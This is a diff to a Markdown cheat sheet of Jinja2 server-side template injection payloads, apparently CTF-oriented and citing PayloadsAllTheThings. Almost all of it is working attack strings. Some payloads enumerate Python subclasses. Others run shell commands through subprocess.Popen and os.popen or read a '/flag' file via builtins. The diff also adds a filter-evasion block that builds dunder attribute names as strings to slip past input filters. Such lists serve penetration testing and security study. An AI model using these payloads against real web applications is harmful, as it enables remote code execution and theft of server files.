@@ -10,12 +10,19 @@ ${{<%[%'"}}%    # Special characteres for detection
 
 ### Jinja2
 
-```
+```django
 http://[URL]/{{ ''.__class__.__mro__[1].__subclasses__() }}   # To list all objects
 http://[URL]/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}   # Using subprocess.Popen index in 401 to achieve rce
 {{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}
 {{request.__class__._load_form_data.__globals__.__builtins__.open("/flag").read() }}
 {{ get_flashed_messages.__globals__.__builtins__.open("/flag").read() }}
+
+# Filter Evasion
+{% set string = "ssti" %}
+{% set class = "__class__" %}
+{% set mro = "__mro__" %}
+{% set subclasses = "__subclasses__" %}
+{{ string|attr(subclasses) }}
 ```
 
 Ref: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
